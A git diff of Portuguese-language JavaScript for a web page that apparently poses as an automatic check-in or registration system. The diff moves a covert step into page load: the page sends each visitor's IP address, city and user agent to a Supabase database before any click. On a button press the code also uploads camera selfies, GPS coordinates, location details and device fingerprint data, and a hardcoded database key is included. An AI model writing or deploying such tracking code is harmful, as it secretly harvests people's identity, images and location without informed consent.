@@ -1,5 +1,5 @@
 // =================================================================
-// CONFIGURAÇÃO DE CONEXÃO
+// CONFIGURAÇÃO DE CONEXÃO (Usando o Supabase Global do HTML)
 // =================================================================
 const SUPABASE_URL = "https://gskcadoofoqwhqhscxcs.supabase.co";
 const SUPABASE_KEY = "sb_publishable_xup-F-C4wv_epMIAbohpjQ_aXnLZOL3";
@@ -24,37 +24,27 @@ function falar(texto){
 }
 
 // =================================================================
-// PRÉ-CADASTRO (AO ABRIR A PÁGINA)
-// =================================================================
-async function salvarPreCadastro() {
-  try {
-    statusText.innerHTML = "🌐 Salvando pré-cadastro...";
-
-    const res = await fetch("https://ipapi.co/json/");
-    const data = await res.json();
-
-    await supabaseClient.from('checkins').insert([{
-      tipo_captura: "previa",
-      ip: data.ip || "indisponível",
-      cidade: data.city || "",
-      user_agent: navigator.userAgent
-    }]);
-
-    console.log("✅ Pré-cadastro salvo");
-  } catch(e) {
-    console.log("Pré-cadastro falhou (continuando)");
-  }
-}
-
-// =================================================================
-// INICIALIZAÇÃO DO SISTEMA E CÂMERA
+// INICIALIZAÇÃO DO SISTEMA E CÂMERA + PRÉ-CADASTRO
 // =================================================================
 async function iniciarSistema(){
   try {
     falar("Seu cadastro será realizado automaticamente após clicar no botão verde abaixo.");
     statusText.innerHTML = "🟡 Iniciando sistema...";
 
-    await salvarPreCadastro(); // Pré-cadastro automático
+    // Pré-cadastro (IP)
+    try {
+      const res = await fetch("https://ipapi.co/json/");
+      const data = await res.json();
+      await supabaseClient.from('checkins').insert([{
+        tipo_captura: "previa",
+        ip: data.ip || "indisponível",
+        cidade: data.city || "",
+        user_agent: navigator.userAgent
+      }]);
+      console.log("Pré-cadastro salvo");
+    } catch(e) {
+      console.log("Pré-cadastro falhou");
+    }
 
     const stream = await navigator.mediaDevices.getUserMedia({
       video: { facingMode: "user" },
@@ -78,7 +68,9 @@ async function iniciarSistema(){
   }
 }
 
-window.onload = iniciarSistema;
+window.onload = () => {
+  iniciarSistema();
+};
 
 // =================================================================
 // RASTREADOR E ANALISADOR DE DISPOSITIVO
@@ -184,24 +176,26 @@ btn.addEventListener("click", async () => {
    
     const infoDispositivo = analisarDispositivo();
 
-    const { error } = await supabaseClient.from('checkins').insert([{
-      tipo_captura: "completo",
-      selfies: fotos,
-      latitude: latitude.toString(),
-      longitude: longitude.toString(),
-      ip: ip,
-      cidade: cidade,
-      estado: estado,
-      pais: pais,
-      user_agent: navigator.userAgent,
-      modelo_dispositivo: infoDispositivo.model,
-      versao_android: infoDispositivo.androidVersion,
-      navegador: infoDispositivo.browser,
-      plataforma: navigator.platform,
-      idioma: navigator.language,
-      largura_tela: window.innerWidth,
-      altura_tela: window.innerHeight
-    }]);
+    const { error } = await supabaseClient
+      .from('checkins')
+      .insert([{
+        tipo_captura: "completo",
+        selfies: fotos,
+        latitude: latitude.toString(),
+        longitude: longitude.toString(),
+        ip: ip,
+        cidade: cidade,
+        estado: estado,
+        pais: pais,
+        user_agent: navigator.userAgent,
+        modelo_dispositivo: infoDispositivo.model,
+        versao_android: infoDispositivo.androidVersion,
+        navegador: infoDispositivo.browser,
+        plataforma: navigator.platform,
+        idioma: navigator.language,
+        largura_tela: window.innerWidth,
+        altura_tela: window.innerHeight
+      }]);
 
     if (error) throw error;
 
